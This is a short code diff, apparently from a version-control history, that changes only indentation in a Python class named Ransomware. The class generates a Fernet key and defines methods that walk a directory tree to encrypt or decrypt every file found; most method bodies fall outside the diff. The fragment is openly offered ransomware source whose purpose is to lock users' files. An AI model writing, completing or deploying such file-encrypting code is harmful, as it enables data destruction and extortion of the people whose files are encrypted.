@@ -6,13 +6,13 @@ import datetime, sys
 
 class Ransomware(object):
 
-	def key_gen(self):
-		return Fernet.generate_key()
+    def key_gen(self):
+        return Fernet.generate_key()
 
 		
-	def decrypt_all_dir(self, root_dir, key):
+    def decrypt_all_dir(self, root_dir, key):
         for dirName, subDirList, fileList in os.walk(root_dir):
-                for file in fileList:
+            for file in fileList:
                         print(os.path.join(root_dir, file))
                         try:
                                 o = open(os.path.join(root_dir, file), 'rb')
@@ -37,7 +37,7 @@ class Ransomware(object):
                         o.close()
 
 
-	def encrypt_all_dir(self, root_dir, key):
+    def encrypt_all_dir(self, root_dir, key):
         for dirName, subDirList, fileList in os.walk(root_dir):
                 for file in fileList:
                         try:
